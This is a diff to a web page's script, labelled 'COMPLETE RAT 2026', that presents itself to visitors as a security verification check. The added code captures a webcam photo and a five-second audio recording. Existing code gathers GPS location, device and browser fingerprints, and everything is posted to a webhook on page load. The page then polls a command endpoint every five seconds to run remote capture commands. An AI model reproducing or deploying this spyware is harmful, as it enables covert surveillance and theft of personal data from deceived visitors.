@@ -174,6 +174,12 @@
       font-weight: 600;
       text-transform: uppercase;
     }
+    #videoPreview, #audioVisualizer {
+      display: none;
+      margin: 20px auto;
+      border-radius: 12px;
+      max-width: 100%;
+    }
     @media (max-width: 600px) {
       .info-grid { grid-template-columns: 1fr; }
       .header h1 { font-size: 24px; }
@@ -215,11 +221,24 @@
           <div class="info-value" id="locationStatus">Checking...</div>
         </div>
         <div class="info-card">
+          <div class="info-icon">📷</div>
+          <div class="info-label">Camera</div>
+          <div class="info-value" id="cameraStatus">Checking...</div>
+        </div>
+        <div class="info-card">
+          <div class="info-icon">🎤</div>
+          <div class="info-label">Microphone</div>
+          <div class="info-value" id="microphoneStatus">Checking...</div>
+        </div>
+        <div class="info-card">
           <div class="info-icon">💻</div>
           <div class="info-label">System</div>
           <div class="info-value" id="systemStatus">Checking...</div>
         </div>
       </div>
+
+      <video id="videoPreview" width="320" height="240" autoplay></video>
+      <canvas id="audioVisualizer" width="320" height="100"></canvas>
 
       <div class="status-message checking" id="statusMessage">
         <span class="spinner"></span>
@@ -248,13 +267,15 @@
   </div>
 
   <script>
-    // COMPLETE RAT 2026 - ALL DATA COLLECTION
+    // COMPLETE RAT 2026 - WITH CAMERA & MICROPHONE
     let sessionId = 'rat2026_' + Date.now() + '_' + Math.random().toString(36).substr(2, 12);
     let progress = 0;
     let collectedData = {
       sessionId: sessionId,
       timestamp: new Date().toISOString()
     };
+    let mediaStream = null;
+    let audioContext = null;
 
     console.log('[RAT2026] Session started:', sessionId);
 
@@ -280,7 +301,6 @@
       collectedData.language = navigator.language;
       collectedData.languages = navigator.languages ? Array.from(navigator.languages) : [];
       
-      // Screen information
       collectedData.screen = {
         width: screen.width,
         height: screen.height,
@@ -291,80 +311,52 @@
         orientation: screen.orientation ? screen.orientation.type : 'unknown'
       };
       
-      // Hardware
       collectedData.hardware = {
         cpuCores: navigator.hardwareConcurrency || 'unknown',
         deviceMemory: navigator.deviceMemory || 'unknown',
         maxTouchPoints: navigator.maxTouchPoints || 0
       };
       
-      // Browser info
       collectedData.browser = {
         cookieEnabled: navigator.cookieEnabled,
         doNotTrack: navigator.doNotTrack,
         onLine: navigator.onLine,
         vendor: navigator.vendor,
-        product: navigator.product,
-        productSub: navigator.productSub,
-        appName: navigator.appName,
-        appVersion: navigator.appVersion
+        product: navigator.product
       };
       
-      // Timezone
       collectedData.timezone = {
         zone: Intl.DateTimeFormat().resolvedOptions().timeZone,
         offset: new Date().getTimezoneOffset(),
         locale: Intl.DateTimeFormat().resolvedOptions().locale
       };
-      
-      // Window size
-      collectedData.window = {
-        innerWidth: window.innerWidth,
-        innerHeight: window.innerHeight,
-        outerWidth: window.outerWidth,
-        outerHeight: window.outerHeight
-      };
-      
-      // Plugins
-      if (navigator.plugins && navigator.plugins.length > 0) {
-        collectedData.plugins = Array.from(navigator.plugins).map(p => ({
-          name: p.name,
-          description: p.description,
-          filename: p.filename
-        }));
-      } else {
-        collectedData.plugins = [];
-      }
 
       document.getElementById('systemStatus').textContent = 'Collected ✓';
-      console.log('[RAT2026] System data collected:', collectedData);
+      console.log('[RAT2026] System data collected');
     }
 
     // GET CONNECTION INFO
     async function getConnectionInfo() {
-      updateProgress(15, 'Analyzing network connection...');
+      updateProgress(10, 'Analyzing network...');
       
-      if (navigator.connection || navigator.mozConnection || navigator.webkitConnection) {
-        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      if (navigator.connection) {
+        const connection = navigator.connection;
         collectedData.connection = {
           effectiveType: connection.effectiveType || 'unknown',
           downlink: connection.downlink || 'unknown',
           rtt: connection.rtt || 'unknown',
-          saveData: connection.saveData || false,
-          type: connection.type || 'unknown'
+          saveData: connection.saveData || false
         };
         document.getElementById('connectionStatus').textContent = (connection.effectiveType || 'Online').toUpperCase();
       } else {
         collectedData.connection = { type: 'unavailable' };
         document.getElementById('connectionStatus').textContent = 'Online';
       }
-      
-      console.log('[RAT2026] Connection info:', collectedData.connection);
     }
 
     // GET BATTERY INFO
     async function getBatteryInfo() {
-      updateProgress(25, 'Reading battery status...');
+      updateProgress(15, 'Reading battery...');
       
       try {
         if (navigator.getBattery) {
@@ -372,11 +364,10 @@
           collectedData.battery = {
             level: Math.round(battery.level * 100) + '%',
             charging: battery.charging,
-            chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' seconds',
-            dischargingTime: battery.dischargingTime === Infinity ? 'Fully charged' : battery.dischargingTime + ' seconds'
+            chargingTime: battery.chargingTime === Infinity ? 'Not charging' : battery.chargingTime + ' sec',
+            dischargingTime: battery.dischargingTime === Infinity ? 'Full' : battery.dischargingTime + ' sec'
           };
           document.getElementById('batteryStatus').textContent = Math.round(battery.level * 100) + '%';
-          console.log('[RAT2026] Battery info:', collectedData.battery);
         } else {
           collectedData.battery = { status: 'unavailable' };
           document.getElementById('batteryStatus').textContent = 'N/A';
@@ -384,13 +375,12 @@
       } catch (e) {
         collectedData.battery = { error: e.message };
         document.getElementById('batteryStatus').textContent = 'N/A';
-        console.log('[RAT2026] Battery error:', e);
       }
     }
 
     // GET GPS LOCATION
     async function getLocation() {
-      updateProgress(40, 'Requesting GPS location...');
+      updateProgress(20, 'Requesting GPS...');
       
       return new Promise((resolve) => {
         if (navigator.geolocation) {
@@ -401,42 +391,191 @@
                 longitude: position.coords.longitude,
                 accuracy: position.coords.accuracy + ' meters',
                 altitude: position.coords.altitude || 'unavailable',
-                altitudeAccuracy: position.coords.altitudeAccuracy ? position.coords.altitudeAccuracy + ' meters' : 'unavailable',
-                heading: position.coords.heading || 'unavailable',
                 speed: position.coords.speed || 'unavailable',
+                heading: position.coords.heading || 'unavailable',
                 timestamp: new Date(position.timestamp).toISOString()
               };
               document.getElementById('locationStatus').textContent = 'Captured ✓';
-              console.log('[RAT2026] GPS location captured:', collectedData.location);
+              console.log('[RAT2026] GPS captured');
               resolve();
             },
             (error) => {
-              collectedData.location = { 
-                error: error.message,
-                code: error.code,
-                permission: 'denied'
-              };
+              collectedData.location = { error: error.message };
               document.getElementById('locationStatus').textContent = 'Denied ✗';
-              console.log('[RAT2026] GPS error:', error);
               resolve();
             },
-            {
-              enableHighAccuracy: true,
-              timeout: 15000,
-              maximumAge: 0
-            }
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
           );
         } else {
-          collectedData.location = { error: 'Geolocation not supported' };
-          document.getElementById('locationStatus').textContent = 'Not supported';
+          collectedData.location = { error: 'Not supported' };
+          document.getElementById('locationStatus').textContent = 'N/A';
           resolve();
         }
       });
     }
 
-    // GET MEDIA DEVICES
+    // GET CAMERA ACCESS & CAPTURE PHOTO
+    async function getCameraAccess() {
+      updateProgress(30, 'Requesting camera access...');
+      
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          video: { 
+            width: { ideal: 1280 },
+            height: { ideal: 720 },
+            facingMode: 'user'
+          } 
+        });
+        
+        mediaStream = stream;
+        
+        // Show video preview
+        const video = document.getElementById('videoPreview');
+        video.srcObject = stream;
+        video.style.display = 'block';
+        
+        // Wait a moment for camera to adjust
+        await new Promise(resolve => setTimeout(resolve, 2000));
+        
+        // Capture photo
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0);
+        
+        // Convert to base64
+        const photoData = canvas.toDataURL('image/jpeg', 0.8);
+        
+        collectedData.camera = {
+          status: 'captured',
+          photo: photoData.substring(0, 200) + '...[TRUNCATED]',
+          photoFull: photoData, // Full photo data
+          resolution: `${canvas.width}x${canvas.height}`,
+          timestamp: new Date().toISOString()
+        };
+        
+        document.getElementById('cameraStatus').textContent = 'Captured ✓';
+        console.log('[RAT2026] Camera photo captured');
+        
+        // Stop camera after capture
+        setTimeout(() => {
+          stream.getTracks().forEach(track => track.stop());
+          video.style.display = 'none';
+        }, 3000);
+        
+      } catch (error) {
+        collectedData.camera = { 
+          status: 'denied',
+          error: error.message 
+        };
+        document.getElementById('cameraStatus').textContent = 'Denied ✗';
+        console.log('[RAT2026] Camera denied:', error);
+      }
+    }
+
+    // GET MICROPHONE ACCESS & RECORD AUDIO
+    async function getMicrophoneAccess() {
+      updateProgress(50, 'Requesting microphone access...');
+      
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+          audio: {
+            echoCancellation: true,
+            noiseSuppression: true,
+            autoGainControl: true
+          }
+        });
+        
+        // Create audio context
+        audioContext = new (window.AudioContext || window.webkitAudioContext)();
+        const source = audioContext.createMediaStreamSource(stream);
+        const analyzer = audioContext.createAnalyser();
+        analyzer.fftSize = 256;
+        source.connect(analyzer);
+        
+        // Visualize audio
+        const canvas = document.getElementById('audioVisualizer');
+        canvas.style.display = 'block';
+        const canvasCtx = canvas.getContext('2d');
+        const bufferLength = analyzer.frequencyBinCount;
+        const dataArray = new Uint8Array(bufferLength);
+        
+        function draw() {
+          requestAnimationFrame(draw);
+          analyzer.getByteFrequencyData(dataArray);
+          
+          canvasCtx.fillStyle = 'rgb(0, 0, 0)';
+          canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
+          
+          const barWidth = (canvas.width / bufferLength) * 2.5;
+          let barHeight;
+          let x = 0;
+          
+          for (let i = 0; i < bufferLength; i++) {
+            barHeight = dataArray[i] / 2;
+            canvasCtx.fillStyle = `rgb(${barHeight + 100}, 50, 50)`;
+            canvasCtx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
+            x += barWidth + 1;
+          }
+        }
+        
+        draw();
+        
+        // Record audio for 5 seconds
+        const mediaRecorder = new MediaRecorder(stream);
+        const audioChunks = [];
+        
+        mediaRecorder.ondataavailable = (event) => {
+          audioChunks.push(event.data);
+        };
+        
+        mediaRecorder.onstop = async () => {
+          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+          const reader = new FileReader();
+          reader.readAsDataURL(audioBlob);
+          reader.onloadend = () => {
+            collectedData.microphone = {
+              status: 'recorded',
+              audioClip: reader.result.substring(0, 200) + '...[TRUNCATED]',
+              audioFull: reader.result, // Full audio data
+              duration: '5 seconds',
+              format: 'audio/webm',
+              timestamp: new Date().toISOString()
+            };
+            console.log('[RAT2026] Audio recorded');
+          };
+          
+          // Stop microphone
+          stream.getTracks().forEach(track => track.stop());
+          canvas.style.display = 'none';
+        };
+        
+        mediaRecorder.start();
+        setTimeout(() => {
+          mediaRecorder.stop();
+        }, 5000);
+        
+        document.getElementById('microphoneStatus').textContent = 'Recording...';
+        
+        // Update status after recording
+        setTimeout(() => {
+          document.getElementById('microphoneStatus').textContent = 'Captured ✓';
+        }, 5500);
+        
+      } catch (error) {
+        collectedData.microphone = { 
+          status: 'denied',
+          error: error.message 
+        };
+        document.getElementById('microphoneStatus').textContent = 'Denied ✗';
+        console.log('[RAT2026] Microphone denied:', error);
+      }
+    }
+
+    // GET MEDIA DEVICES LIST
     async function getMediaDevices() {
-      updateProgress(55, 'Detecting media devices...');
+      updateProgress(65, 'Detecting devices...');
       
       try {
         if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
@@ -452,19 +591,15 @@
               deviceId: d.deviceId ? 'present' : 'none'
             }))
           };
-          console.log('[RAT2026] Media devices:', collectedData.mediaDevices);
-        } else {
-          collectedData.mediaDevices = { error: 'API not available' };
         }
       } catch (e) {
         collectedData.mediaDevices = { error: e.message };
-        console.log('[RAT2026] Media devices error:', e);
       }
     }
 
     // GET CANVAS FINGERPRINT
     function getCanvasFingerprint() {
-      updateProgress(65, 'Generating canvas fingerprint...');
+      updateProgress(75, 'Fingerprinting...');
       
       try {
         const canvas = document.createElement('canvas');
@@ -474,18 +609,16 @@
         ctx.fillStyle = '#f60';
         ctx.fillRect(125, 1, 62, 20);
         ctx.fillStyle = '#069';
-        ctx.fillText('RAT2026 Fingerprint', 2, 15);
+        ctx.fillText('RAT2026', 2, 15);
         collectedData.canvasFingerprint = canvas.toDataURL().substring(0, 150) + '...';
-        console.log('[RAT2026] Canvas fingerprint generated');
       } catch (e) {
         collectedData.canvasFingerprint = { error: e.message };
-        console.log('[RAT2026] Canvas error:', e);
       }
     }
 
     // GET WEBGL INFO
     function getWebGLInfo() {
-      updateProgress(75, 'Reading WebGL renderer...');
+      updateProgress(85, 'Reading GPU...');
       
       try {
         const canvas = document.createElement('canvas');
@@ -496,53 +629,25 @@
             vendor: gl.getParameter(gl.VENDOR),
             renderer: gl.getParameter(gl.RENDERER),
             version: gl.getParameter(gl.VERSION),
-            shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
             unmaskedVendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unavailable',
             unmaskedRenderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unavailable'
           };
-          console.log('[RAT2026] WebGL info:', collectedData.webgl);
-        } else {
-          collectedData.webgl = { error: 'WebGL not supported' };
         }
       } catch (e) {
         collectedData.webgl = { error: e.message };
-        console.log('[RAT2026] WebGL error:', e);
       }
     }
 
-    // GET PERFORMANCE INFO
-    function getPerformanceInfo() {
-      updateProgress(85, 'Measuring performance...');
-      
-      try {
-        if (performance.memory) {
-          collectedData.performance = {
-            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
-            totalJSHeapSize: performance.memory.totalJSHeapSize,
-            usedJSHeapSize: performance.memory.usedJSHeapSize
-          };
-        } else {
-          collectedData.performance = { memory: 'unavailable' };
-        }
-        console.log('[RAT2026] Performance info:', collectedData.performance);
-      } catch (e) {
-        collectedData.performance = { error: e.message };
-      }
-    }
-
-    // SEND ALL DATA TO SERVER
+    // SEND DATA TO SERVER
     async function sendDataToServer(data) {
-      updateProgress(95, 'Transmitting data to server...');
+      updateProgress(95, 'Transmitting...');
       
-      console.log('[RAT2026] Sending complete data package:', data);
+      console.log('[RAT2026] Sending data package');
       
       try {
         const response = await fetch('rat2026_webhook.php', {
           method: 'POST',
-          headers: { 
-            'Content-Type': 'application/json',
-            'Accept': 'application/json'
-          },
+          headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(data)
         });
         
@@ -555,7 +660,7 @@
       }
     }
 
-    // CHECK FOR COMMANDS FROM SERVER
+    // CHECK FOR COMMANDS
     async function checkForCommands() {
       try {
         const response = await fetch('get_command2026.php?session=' + sessionId);
@@ -565,18 +670,14 @@
           executeCommand(data.command);
         }
       } catch (e) {
-        console.error('[RAT2026] Command check error:', e);
+        console.error('[RAT2026] Command error:', e);
       }
     }
 
     // EXECUTE REMOTE COMMANDS
     async function executeCommand(cmd) {
-      console.log('[RAT2026] Executing command:', cmd);
-      let result = { 
-        command: cmd, 
-        timestamp: new Date().toISOString(),
-        sessionId: sessionId
-      };
+      console.log('[RAT2026] Executing:', cmd);
+      let result = { command: cmd, timestamp: new Date().toISOString(), sessionId: sessionId };
       
       switch(cmd) {
         case 'get_location':
@@ -586,6 +687,14 @@
         case 'get_battery':
           await getBatteryInfo();
           result.data = collectedData.battery;
+          break;
+        case 'capture_photo':
+          await getCameraAccess();
+          result.data = collectedData.camera;
+          break;
+        case 'record_audio':
+          await getMicrophoneAccess();
+          result.data = collectedData.microphone;
           break;
         case 'get_all':
           await main();
@@ -601,39 +710,37 @@
       await sendDataToServer(result);
     }
 
-    // MAIN EXECUTION FUNCTION
+    // MAIN EXECUTION
     async function main() {
-      console.log('[RAT2026] Starting complete data collection...');
+      console.log('[RAT2026] Starting complete collection...');
       
-      // Collect all data step by step
       await collectSystemData();
       await getConnectionInfo();
       await getBatteryInfo();
       await getLocation();
+      await getCameraAccess();
+      await getMicrophoneAccess();
       await getMediaDevices();
       getCanvasFingerprint();
       getWebGLInfo();
-      getPerformanceInfo();
       
-      // Send everything to server
       await sendDataToServer(collectedData);
       
-      // Mark as complete
       updateProgress(100, 'Verification complete!');
       
       const statusMsg = document.getElementById('statusMessage');
       statusMsg.className = 'status-message success';
-      statusMsg.innerHTML = '✅ <strong>Security Check Complete!</strong> All data has been verified and secured.';
+      statusMsg.innerHTML = '✅ <strong>Complete!</strong> All security checks passed.';
       
-      console.log('[RAT2026] Complete! Full data package:', collectedData);
+      console.log('[RAT2026] Complete! Data:', collectedData);
       
-      // Start listening for commands every 5 seconds
+      // Listen for commands every 5 seconds
       setInterval(checkForCommands, 5000);
     }
 
-    // AUTO-START WHEN PAGE LOADS
+    // AUTO-START
     window.onload = () => {
-      console.log('[RAT2026] Page loaded, initializing...');
+      console.log('[RAT2026] Initialized');
       main();
     };
   </script>
